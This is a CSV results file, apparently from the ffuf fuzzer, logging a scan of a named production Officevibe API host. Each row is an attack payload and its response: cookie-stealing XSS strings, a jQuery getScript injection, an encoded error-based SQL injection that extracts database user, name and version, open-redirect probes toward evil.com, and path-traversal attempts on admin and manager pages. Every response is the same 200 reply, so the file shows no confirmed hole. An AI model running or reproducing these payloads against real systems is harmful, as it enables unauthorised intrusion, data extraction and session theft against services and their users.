FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
?mobile=1&mp_idx=%22;$.getScript(%27//127.0.0.1/z%27);/,https://insightsapi-insights.prod.officevibe.com/?mobile=1&mp_idx=%22;$.getScript(%27//127.0.0.1/z%27);/,,20499,200,1588,1087,32,text/plain; charset=utf-8,48.013444ms,
.,https://insightsapi-insights.prod.officevibe.com/.,,59964,200,1588,1087,32,text/plain; charset=utf-8,41.324644ms,
?mod=<script>alert(document.cookie)</script>&op=browse,https://insightsapi-insights.prod.officevibe.com/?mod=<script>alert(document.cookie)</script>&op=browse,,87084,200,1588,1087,32,text/plain; charset=utf-8,43.222255ms,
//evil.com/%2F..,https://insightsapi-insights.prod.officevibe.com///evil.com/%2F..,,106852,200,1588,1087,32,text/plain; charset=utf-8,48.051569ms,
"%0a%0a<script>alert(\""Vulnerable\"")</script>.jsp","https://insightsapi-insights.prod.officevibe.com/%0a%0a<script>alert(\""Vulnerable\"")</script>.jsp",,112124,200,1588,1087,32,text/plain; charset=utf-8,41.713768ms,
#/../admin,https://insightsapi-insights.prod.officevibe.com/#/../admin,,113455,200,1588,1087,32,text/plain; charset=utf-8,70.765932ms,
#/../console,https://insightsapi-insights.prod.officevibe.com/#/../console,,162227,200,1588,1087,32,text/plain; charset=utf-8,58.847721ms,
#/../manager/text,https://insightsapi-insights.prod.officevibe.com/#/../manager/text,,168130,200,1588,1087,32,text/plain; charset=utf-8,43.790956ms,
?objGroupID=%31%32%27%7c%7c%28SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20%28seLEcT%20112%20frOM(SElecT%20CouNT(*)%2cConCAT%28CONcat(0x203a20%2cUseR()%2cDAtaBASe()%2cVErsION())%2c(SeLEct%20%28ELT(112=112%2c1%29%29%29%2cFLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x%29a%29%29%7c%7c%27,https://insightsapi-insights.prod.officevibe.com/?objGroupID=%31%32%27%7c%7c%28SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20%28seLEcT%20112%20frOM(SElecT%20CouNT(*)%2cConCAT%28CONcat(0x203a20%2cUseR()%2cDAtaBASe()%2cVErsION())%2c(SeLEct%20%28ELT(112=112%2c1%29%29%29%2cFLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x%29a%29%29%7c%7c%27,,177755,200,1588,1087,32,text/plain; charset=utf-8,52.43642ms,
?targetURL=https://www.owler.com/iaApp/getDataCard.htm,https://insightsapi-insights.prod.officevibe.com/?targetURL=https://www.owler.com/iaApp/getDataCard.htm,,190572,200,1588,1087,32,text/plain; charset=utf-8,49.991535ms,
#/../html,https://insightsapi-insights.prod.officevibe.com/#/../html,,198439,200,1588,1087,32,text/plain; charset=utf-8,32.247746ms,
#/../www,https://insightsapi-insights.prod.officevibe.com/#/../www,,203527,200,1588,1087,32,text/plain; charset=utf-8,33.935029ms,
#/../manager/html,https://insightsapi-insights.prod.officevibe.com/#/../manager/html,,205028,200,1588,1087,32,text/plain; charset=utf-8,42.666553ms,
/evil.com/%2F..,https://insightsapi-insights.prod.officevibe.com//evil.com/%2F..,,272876,200,1588,1087,32,text/plain; charset=utf-8,37.373008ms,
